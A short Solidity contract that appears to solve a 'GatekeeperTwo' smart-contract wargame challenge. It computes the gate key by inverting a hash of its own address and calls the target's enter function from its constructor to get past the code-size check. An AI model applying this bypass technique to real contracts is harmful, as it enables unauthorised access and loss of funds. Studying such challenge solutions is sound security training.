pragma solidity ^0.8.0;

contract AttackOnGatekeeperTwo {
  constructor(address GatekeeperTwo) {
    bytes8 gateKey = ~bytes8(keccak256(abi.encodePacked(address(this))));
    bytes memory encodedParams = abi.encodeWithSelector(bytes4(keccak256('enter(bytes8)')), gateKey);
    GatekeeperTwo.call(encodedParams);
  }
}
